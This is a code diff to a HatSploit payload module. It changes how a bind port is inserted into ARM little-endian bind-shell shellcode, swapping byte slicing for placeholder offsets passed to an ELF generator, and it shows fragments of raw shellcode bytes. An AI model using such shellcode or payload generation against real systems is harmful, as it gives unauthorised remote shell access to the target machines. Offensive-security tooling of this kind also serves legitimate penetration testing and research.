@@ -60,7 +60,11 @@ class HatSploitPayload(Payload, HatVenom):
 
     def run(self):
         bind_port = self.parse_options(self.options)
-        bind_port = self.port_bytes(bind_port)
+
+        offsets = {
+            'bport1': self.port_bytes(bind_port)[1:2],
+            'bport2': self.port_bytes(bind_port)[0:1]
+        }
 
         self.output_process("Generating shellcode...")
         shellcode = (
@@ -73,8 +77,8 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x66\x00\x90\xef"
             b"\x0c\xd0\x8d\xe2"
             b"\x00\x60\xa0\xe1"
-            + bind_port[1:2] + b"\x10\xa0\xe3"
-            + bind_port[0:1] + b"\x70\xa0\xe3"
+            b":bport1:\x10\xa0\xe3"
+            b":bport2:\x70\xa0\xe3"
             b"\x01\x1c\xa0\xe1"
             b"\x07\x18\x81\xe0"
             b"\x02\x10\x81\xe2"
@@ -132,6 +136,6 @@ class HatSploitPayload(Payload, HatVenom):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate('elf', 'armle', shellcode)
+        payload = self.generate('elf', 'armle', shellcode, offsets)
 
         return payload
